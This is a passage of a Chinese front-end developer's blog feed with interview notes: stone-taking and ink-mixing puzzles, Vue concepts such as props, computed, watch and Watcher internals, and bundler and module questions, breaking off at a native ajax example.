      <url>2018/08/03/%E9%9D%A2%E8%AF%95-%E6%99%BA%E5%8A%9B%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h2 id="抓石子"><a href="#抓石子" class="headerlink" title="抓石子"></a>抓石子</h2><blockquote><p>A、B从一个石子堆里抓石子，交替进行，一个人可以抓1或者2颗，A先走，几种可能性。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 和爬楼梯类似 f(n) = f(n-1) + f(n-2)</span><span class="token keyword">function</span> <span class="token function">getClimbingWays</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">2</span>    <span class="token keyword">let</span> a <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> b <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">,</span> temp <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        temp <span class="token operator">=</span> a <span class="token operator">+</span> b        a <span class="token operator">=</span> b        b <span class="token operator">=</span> temp    <span class="token punctuation">}</span>    <span class="token keyword">return</span> temp<span class="token punctuation">}</span></code></pre><blockquote><p>最后抓的算负，16颗的情况下，A、B有必胜可能么(谁先抓，怎么抓，谁必胜)。</p></blockquote><p><strong>巴什博奕(Bash Game):</strong></p><p>只有一堆n个物品,两个人轮流从这堆物品中取物,规定每次至少取一个,最多取m个.最后取光者得胜</p><blockquote><p>结论：若<code>n%(m+1)=0</code>，则先手必败，否则先手必胜 </p></blockquote><p>显然,如果<code>n=m+1</code>,那么由于一次最多只能取<code>m</code>个,所以,无论先取者拿走多少个,后取者都能够一次拿走剩余的物品,后者取胜。 引入一个概念，奇异局势。当面对这个局势时则会失败。</p><p><strong>奇异局势的判定：</strong></p><blockquote><p> 一般的奇异局势是<code>n=(m+1)*i</code>，其中i为自然数，即<code>n%(m+1)=0</code>，面对这种情况无论我怎么取，对方总可以将其恢复为<code>n%(m+1)=0</code>，一直到<code>n=(m+1)</code>局势。</p></blockquote><p><strong>玩家的策略：</strong></p><blockquote><p>就是把当前面对的非奇异局势变为奇异局势留给对方。如果当前的石子个数为<code>(m+1)*i+s</code>，那么就将s个石子取走，使其达到奇异局势。</p></blockquote><p><strong>回到原题如果最后抓的算负</strong></p><blockquote><p>结论，若<code>n%(m+1)=1</code>，则先手必败。即<code>n%3==1</code>，则先手必败</p><p>我剩1个必输</p><p>如果有4个，无论我怎么取对方都可以让我剩1个</p><p>如果有7个，无论我怎么取对方都可以让我剩4个</p><p>如果16个的话，先手必败</p></blockquote><h2 id="红墨水蓝墨水"><a href="#红墨水蓝墨水" class="headerlink" title="红墨水蓝墨水"></a>红墨水蓝墨水</h2><blockquote><p>一瓶红墨水50克,一瓶蓝墨水50克,从红墨水中取一克红墨水放入蓝墨水中，然后又从蓝墨水瓶中取出一克混合墨水送还到红墨水瓶中，请问现在是红墨水瓶的蓝墨水多还是蓝墨水瓶中的红墨水多？一样多</p></blockquote><pre class=" language-js"><code class="language-js">第一次取，此时蓝墨水瓶中的混合墨水的比例为<span class="token number">50</span><span class="token punctuation">:</span><span class="token number">1</span>，即混合墨水的应为<span class="token number">1</span><span class="token operator">/</span><span class="token number">51</span>的红墨水和<span class="token number">50</span><span class="token operator">/</span><span class="token number">51</span>的蓝墨水。<span class="token number">1</span>克混合墨水的应为<span class="token number">1</span><span class="token operator">/</span><span class="token number">51</span>克的红墨水加<span class="token number">50</span><span class="token operator">/</span><span class="token number">51</span>克的蓝墨水。第二次取：红墨水瓶中的蓝墨水 <span class="token number">50</span><span class="token operator">/</span><span class="token number">51</span>蓝墨水瓶中的红墨水 <span class="token number">1</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token operator">/</span><span class="token number">51</span> <span class="token operator">=</span> <span class="token number">50</span><span class="token operator">/</span><span class="token number">51</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题（一）</title>
      <link href="2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>Vue的组件传值的方式（8种）<ul><li>父传子：数组/对象形式，单向数据流（在子组件中改变prop会出现警告）</li><li>子传父：联系发布订阅模式（$emit,$on）讲一下，怎么实现一个发布订阅模式</li></ul></li><li>打包工具webpack，rollup，parcel分别适用于什么场景？</li><li>如何理解 vue 响应式原理（2.0/3.0）？</li><li>computed和watcher的原理，有什么区别及应用场景？（Watcher，惰性）</li><li>为什么 Vue3.0 采用了 proxy，有什么优势？</li><li>说一下模块化的方案，CommonJs，AMD，CMD，ES Modules</li><li>介绍一下 Vue 的 Virtual DOM 与 Diff 算法</li><li>说一下 $nextTick 的原理</li><li>Vue 组件 data 为什么必须是函数 ?</li><li>webpack插件主要是做什么的，常用的有哪些，自己写过webpack插件吗</li><li>webpack 热更新原理</li><li>js执行会阻塞DOM树的解析和渲染，那么css加载会阻塞DOM树的解析和渲染吗？css会阻塞js吗</li></ul><h2 id="Vue的组件传值的方式（8种）"><a href="#Vue的组件传值的方式（8种）" class="headerlink" title="Vue的组件传值的方式（8种）"></a>Vue的组件传值的方式（8种）</h2><ul><li><a href="https://www.jinjingxuan.com/2020/11/12/Vue-Vue%E7%BB%84%E4%BB%B6%E9%80%9A%E4%BF%A1%E7%9A%84%E6%96%B9%E5%BC%8F/" target="_blank" rel="noopener">Vue组件通信的方式</a></li><li><a href="https://www.jinjingxuan.com/2020/11/12/Vue-Vue%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">如何实现发布订阅模式</a></li></ul><h2 id="props的写法"><a href="#props的写法" class="headerlink" title="props的写法"></a>props的写法</h2><ul><li><p>props 可以是数组或对象，用于接收来自父组件的数据。props 可以是简单的数组，或者使用对象作为替代，对象允许配置高级选项，如类型检测、自定义验证和设置默认值。</p><p>你可以基于对象的语法使用以下选项：</p><ul><li><code>type</code>：可以是下列原生构造函数中的一种：<code>String</code>、<code>Number</code>、<code>Boolean</code>、<code>Array</code>、<code>Object</code>、<code>Date</code>、<code>Function</code>、<code>Symbol</code>、任何自定义构造函数、或上述内容组成的数组。会检查一个 prop 是否是给定的类型，否则抛出警告。</li><li><code>default</code>：<code>any</code><br>为该 prop 指定一个默认值。如果该 prop 没有被传入，则换做用这个值。对象或数组的默认值必须从一个工厂函数返回。</li><li><code>required</code>：<code>Boolean</code><br>定义该 prop 是否是必填项。在非生产环境中，如果这个值为 truthy 且该 prop 没有被传入的，则一个控制台警告将会被抛出。</li><li><code>validator</code>：<code>Function</code><br>自定义验证函数会将该 prop 的值作为唯一的参数代入。在非生产环境下，如果该函数返回一个 false 的值 (也就是验证失败)，一个控制台警告将会被抛出。你可以在<a href="https://cn.vuejs.org/v2/guide/components-props.html#Prop-验证" target="_blank" rel="noopener">这里</a>查阅更多 prop 验证的相关信息。</li></ul></li></ul><pre class=" language-js"><code class="language-js">props<span class="token punctuation">:</span> <span class="token punctuation">{</span>        detail<span class="token punctuation">:</span> <span class="token punctuation">{</span>            type<span class="token punctuation">:</span> Object<span class="token punctuation">,</span>            <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span>            required<span class="token punctuation">:</span> <span class="token boolean">true</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        age<span class="token punctuation">:</span> <span class="token punctuation">{</span>          type<span class="token punctuation">:</span> Number<span class="token punctuation">,</span>          <span class="token keyword">default</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>          required<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>          validator<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>value<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> value <span class="token operator">>=</span> <span class="token number">0</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 子组件向父组件传值时，一个事件可以传递多个参数</span><span class="token comment" spellcheck="true">// 子组件点击事件</span><span class="token function">click</span><span class="token punctuation">(</span>params1<span class="token punctuation">,</span> params2<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">$emit</span><span class="token punctuation">(</span><span class="token string">'selectDay'</span><span class="token punctuation">,</span> params1<span class="token punctuation">,</span> params2<span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 父组件获取值</span><span class="token comment" spellcheck="true">// &lt;child  @selectDay="fun">&lt;/child></span>fun <span class="token punctuation">(</span>params1<span class="token punctuation">,</span> params2<span class="token punctuation">)</span> <span class="token punctuation">{</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>params1<span class="token punctuation">,</span> params2<span class="token punctuation">)</span> <span class="token punctuation">}</span></code></pre><h2 id="打包工具webpack，rollup，parcel分别适用于什么场景？"><a href="#打包工具webpack，rollup，parcel分别适用于什么场景？" class="headerlink" title="打包工具webpack，rollup，parcel分别适用于什么场景？"></a>打包工具webpack，rollup，parcel分别适用于什么场景？</h2><blockquote><p>webpack：一般用于大型复杂应用</p><p>rollup：一般用于开发第三方类库，例如 vue 源码就是用 rollup 打包的</p><p>parcel：轻量快捷，一般用于自己写一些小的 demo</p></blockquote><h2 id="如何理解-vue-响应式原理？"><a href="#如何理解-vue-响应式原理？" class="headerlink" title="如何理解 vue 响应式原理？"></a>如何理解 vue 响应式原理？</h2><ul><li><a href="https://www.jinjingxuan.com/2020/11/12/Vue-Vue%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">Vue响应式原理详解</a></li><li><a href="https://www.jinjingxuan.com/2020/12/17/Vue-Vue3.0%EF%BC%88%E4%BA%8C%EF%BC%89/" target="_blank" rel="noopener">Vue 3.0响应式原理</a></li></ul><h2 id="computed和watcher的原理，有什么区别及应用场景？（Watcher，惰性）"><a href="#computed和watcher的原理，有什么区别及应用场景？（Watcher，惰性）" class="headerlink" title="computed和watcher的原理，有什么区别及应用场景？（Watcher，惰性）"></a>computed和watcher的原理，有什么区别及应用场景？（Watcher，惰性）</h2><p><strong>一、 计算属性（computed）</strong> </p><blockquote><p>computed 是计算属性，它会根据你所依赖的数据动态显示新的计算结果</p></blockquote><p>通过计算出来的属性<strong>不需要调用</strong>直接可以在 DOM 里使用</p><pre class=" language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">'</span>app<span class="token punctuation">'</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>我是原始值: {{ message }}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>我是计算属性的值: {{ computedMessage}}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">let</span> app <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            el<span class="token punctuation">:</span><span class="token string">'#app'</span><span class="token punctuation">,</span>            data<span class="token punctuation">:</span> <span class="token punctuation">{</span>                message<span class="token punctuation">:</span> <span class="token string">'hello'</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            computed<span class="token punctuation">:</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// 计算属性的 getter</span>                computedMessage<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">// `this` 指向 app 实例</span>                    <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>message<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">reverse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p><strong>二、methods同样可实现</strong> </p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>app<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Original message: "{{ message }}"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>Computed reversed message: "{{ reversedMessage() }}"<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>const app = new Vue({  el: '#app',  data: {    message: 'Hello'  },  methods: {    // 计算属性的 getter    reversedMessage: function () {      // this 指向 Vue 实例      return this.message.split('').reverse().join('')    }  }})</code></pre><p><strong>三、监听属性（watch）</strong> </p><blockquote><p>侦听属性 <code>watch</code> 用来观察和响应数据的变动。 </p></blockquote><pre class=" language-html"><code class="language-html">    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>demodiv<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>              <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">v-model</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        {{text}}             <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script language-javascript">        <span class="token keyword">new</span> <span class="token class-name">Vue</span><span class="token punctuation">(</span><span class="token punctuation">{</span>            el<span class="token punctuation">:</span><span class="token string">"#demodiv"</span><span class="token punctuation">,</span>            data<span class="token punctuation">:</span><span class="token punctuation">{</span>                    text<span class="token punctuation">:</span><span class="token string">"abcdefg"</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            watch<span class="token punctuation">:</span><span class="token punctuation">{</span>                <span class="token function">text</span><span class="token punctuation">(</span>newval<span class="token punctuation">,</span>oldval<span class="token punctuation">)</span><span class="token punctuation">{</span>                    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>newval<span class="token operator">+</span><span class="token string">'========'</span><span class="token operator">+</span>oldval<span class="token punctuation">)</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span>    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><p>（1）首先表明，computed 和 watch 都属于 watcher，在<code>initState</code>中初始化，一共有三种还有一种是渲染 Watcher 在 mount 中初始化，本质上都依赖于 Vue 的响应式原理。</p><p>（2）computed 本质是一个惰性求值的观察者，具有缓存性，只有当依赖变化后，第一次访问 computed 属性，才会计算新的值，其内部通过dirty属性标记计算属性是否需要重新求值。而 watch 则是当数据发生变化便会调用执行函数。</p><p>（3）<code>computed</code>: 当某个数据需要随着（依赖于）另一个数据的变动而作出改变时，这时候你需要使用计算属性。 <code>watch</code>: 当某个数据发生变化时，需要对这个数据的变化进行反应（进行一系列操作），这时候你需要使用侦听属性。<code>methods</code>: 与计算属性不同的是，每次读取数据时，都是计算一遍，除非你不需要缓存，否则这样做需要大量的性能开销。  </p><h3 id="watch的两个参数"><a href="#watch的两个参数" class="headerlink" title="watch的两个参数"></a>watch的两个参数</h3><ul><li>immediate：代表立即执行，而不是等监听对象改变再执行</li><li>deep：深度监听，对象的属性改变也可以监听的到</li></ul><p>可以参考<a href="https://zhuanlan.zhihu.com/p/86273758" target="_blank" rel="noopener">这篇文章</a></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 两种写法</span>watch<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">'user.firstName'</span><span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>newValue<span class="token punctuation">,</span> oldValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span>fullName <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span>firstName <span class="token operator">+</span> <span class="token string">''</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span>lastName    <span class="token punctuation">}</span><span class="token punctuation">}</span>watch<span class="token punctuation">:</span> <span class="token punctuation">{</span>    <span class="token string">'user'</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>        handler<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>newValue<span class="token punctuation">,</span> oldValue<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span>fullName <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span>firstName <span class="token operator">+</span> <span class="token string">''</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>user<span class="token punctuation">.</span>lastName        <span class="token punctuation">}</span><span class="token punctuation">,</span>        deep<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        immediate<span class="token punctuation">:</span> <span class="token boolean">true</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="三种类型的-Watcher-对象"><a href="#三种类型的-Watcher-对象" class="headerlink" title="三种类型的 Watcher 对象"></a>三种类型的 Watcher 对象</h3><ul><li><p>没有静态方法，因为 $watch 方法中要使用 Vue 的实例</p></li><li><p>Watcher 分三种：计算属性 Watcher、用户 Watcher (侦听器)、渲染 Watcher</p><ul><li>计算属性 Watcher 在 initComputd 中创建</li><li>用户 Watcher (侦听器) 在 Vue.$watch 中创建</li><li>渲染 Watcher 在 mountComponent 中创建</li></ul></li><li><p>Watcher内部实现是一样的，<code>src/core/observer/watcher.js</code>中，并且每一个Watcher都有一个id</p></li><li><p>创建顺序：计算属性 Watcher、用户 Watcher (侦听器)、渲染 Watcher</p></li><li><p>vm.$watch()</p><ul><li>src\core\instance\state.js</li></ul></li></ul><pre class=" language-js"><code class="language-js">Vue<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>$watch <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>    expOrFn<span class="token punctuation">:</span> string <span class="token operator">|</span> Function<span class="token punctuation">,</span>    cb<span class="token punctuation">:</span> any<span class="token punctuation">,</span>    options<span class="token operator">?</span><span class="token punctuation">:</span> Object  <span class="token punctuation">)</span><span class="token punctuation">:</span> Function <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 获取 Vue 实例 this</span>    <span class="token keyword">const</span> vm<span class="token punctuation">:</span> Component <span class="token operator">=</span> <span class="token keyword">this</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isPlainObject</span><span class="token punctuation">(</span>cb<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 判断如果 cb 是对象执行 createWatcher</span>      <span class="token keyword">return</span> <span class="token function">createWatcher</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> expOrFn<span class="token punctuation">,</span> cb<span class="token punctuation">,</span> options<span class="token punctuation">)</span>    <span class="token punctuation">}</span>    options <span class="token operator">=</span> options <span class="token operator">||</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    options<span class="token punctuation">.</span>user <span class="token operator">=</span> <span class="token boolean">true</span>    <span class="token comment" spellcheck="true">// 创建用户 watcher 对象</span>    <span class="token keyword">const</span> watcher <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Watcher</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> expOrFn<span class="token punctuation">,</span> cb<span class="token punctuation">,</span> options<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">// 判断 immediate 如果为 true</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>options<span class="token punctuation">.</span>immediate<span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token comment" spellcheck="true">// 立即执行一次 cb 回调，并且把当前值传入</span>      <span class="token keyword">try</span> <span class="token punctuation">{</span>        cb<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>vm<span class="token punctuation">,</span> watcher<span class="token punctuation">.</span>value<span class="token punctuation">)</span>      <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">error</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">handleError</span><span class="token punctuation">(</span>error<span class="token punctuation">,</span> vm<span class="token punctuation">,</span> <span class="token template-string"><span class="token string">`callback for immediate watcher "</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>watcher<span class="token punctuation">.</span>expression<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">"`</span></span><span class="token punctuation">)</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 返回取消监听的方法</span>    <span class="token keyword">return</span> <span class="token keyword">function</span> unwatchFn <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      watcher<span class="token punctuation">.</span><span class="token function">teardown</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span></code></pre><h2 id="为什么-Vue3-0-采用了-proxy，有什么优势？"><a href="#为什么-Vue3-0-采用了-proxy，有什么优势？" class="headerlink" title="为什么 Vue3.0 采用了 proxy，有什么优势？"></a>为什么 Vue3.0 采用了 proxy，有什么优势？</h2><ul><li><a href="https://www.jinjingxuan.com/2020/11/12/Vue-Vue%E5%93%8D%E5%BA%94%E5%BC%8F%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">Vue响应式原理详解</a></li></ul><h2 id="说一下模块化的方案，CommonJs，AMD，CMD，ESModules"><a href="#说一下模块化的方案，CommonJs，AMD，CMD，ESModules" class="headerlink" title="说一下模块化的方案，CommonJs，AMD，CMD，ESModules"></a>说一下模块化的方案，CommonJs，AMD，CMD，ESModules</h2><ul><li><a href="https://www.jinjingxuan.com/2020/09/05/%E6%A8%A1%E5%9D%97%E5%8C%96-%E6%A8%A1%E5%9D%97%E5%8C%96/" target="_blank" rel="noopener">模块化</a></li></ul><h2 id="介绍一下-Vue-的-Virtual-DOM-与-Diff-算法"><a href="#介绍一下-Vue-的-Virtual-DOM-与-Diff-算法" class="headerlink" title="介绍一下 Vue 的 Virtual DOM 与 Diff 算法"></a>介绍一下 Vue 的 Virtual DOM 与 Diff 算法</h2><ul><li><a href="https://www.jinjingxuan.com/2020/09/24/VirtualDOM-VirtualDOM%E4%B8%8EDiff%E7%AE%97%E6%B3%95/" target="_blank" rel="noopener">Virtual DOM 与 Diff 算法</a></li></ul><h2 id="说一下-nextTick-的原理"><a href="#说一下-nextTick-的原理" class="headerlink" title="说一下 $nextTick 的原理"></a>说一下 $nextTick 的原理</h2><ul><li><a href="https://www.jinjingxuan.com/2020/10/16/Vue-Vue%E6%BA%90%E7%A0%81%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/#toc-heading-3" target="_blank" rel="noopener">nextTick</a></li></ul><h2 id="Vue-组件-data-为什么必须是函数"><a href="#Vue-组件-data-为什么必须是函数" class="headerlink" title="Vue 组件 data 为什么必须是函数 ?"></a>Vue 组件 data 为什么必须是函数 ?</h2><blockquote><p>vue中data 是可以直接写成一个对象的,但这是保证这个组件不会被复用的情况下</p><p>由于组价的复用,其实是创建多个vue实例,如果data中仍然是只是一个对象,那么其实创建出来的实例保持的都是对同一个对象的引用。</p><p>所以我们通过 一个 函数执行返回了一个新的全新的数据对象。</p></blockquote><h2 id="webpack插件主要是做什么的，常用的有哪些，自己写过webpack插件吗"><a href="#webpack插件主要是做什么的，常用的有哪些，自己写过webpack插件吗" class="headerlink" title="webpack插件主要是做什么的，常用的有哪些，自己写过webpack插件吗"></a>webpack插件主要是做什么的，常用的有哪些，自己写过webpack插件吗</h2><ul><li><a href="https://www.jinjingxuan.com/2020/09/06/webpack-webpack%EF%BC%88%E4%BA%8C%EF%BC%89/" target="_blank" rel="noopener">webpack插件</a></li></ul><h2 id="webpack-热更新原理"><a href="#webpack-热更新原理" class="headerlink" title="webpack 热更新原理"></a>webpack 热更新原理</h2><ul><li><a href="https://juejin.cn/post/6844904020528594957" target="_blank" rel="noopener">从零实现webpack热更新HMR</a></li></ul><h2 id="js执行会阻塞DOM树的解析和渲染，那么css加载会阻塞DOM树的解析和渲染吗？css会阻塞js吗"><a href="#js执行会阻塞DOM树的解析和渲染，那么css加载会阻塞DOM树的解析和渲染吗？css会阻塞js吗" class="headerlink" title="js执行会阻塞DOM树的解析和渲染，那么css加载会阻塞DOM树的解析和渲染吗？css会阻塞js吗"></a>js执行会阻塞DOM树的解析和渲染，那么css加载会阻塞DOM树的解析和渲染吗？css会阻塞js吗</h2><ul><li><a href="https://www.jinjingxuan.com/2020/11/23/%E6%B5%8F%E8%A7%88%E5%99%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">浏览器渲染相关</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 面试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>面试题（七）</title>
      <link href="2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E4%B8%83%EF%BC%89/"/>
      <url>2018/08/03/%E9%9D%A2%E8%AF%95-%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%88%E4%B8%83%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>原生ajax</li><li>display有哪些属性</li><li>position有哪些属性</li><li>transform有哪些属性</li><li>input标签的属性</li><li>如何给一个页面添加10000个div</li><li>原生js操作DOM的API</li><li>伪类和伪元素</li><li>变量提升的一道题</li><li>正则将手机号中间四位变为*</li><li>图片懒加载</li><li>二分查找</li><li>promise能封装setInterval吗</li></ul><h2 id="原生ajax"><a href="#原生ajax" class="headerlink" title="原生ajax"></a>原生ajax</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 原生ajax实现</span><span class="token keyword">function</span> <span class="token function">ajax</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">var</span> xhr <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">XMLHttpRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    xhr<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">'method'</span><span class="token punctuation">,</span> <span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    xhr<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    xhr<span class="token punctuation">.</span>onreadystatechange <span class="token 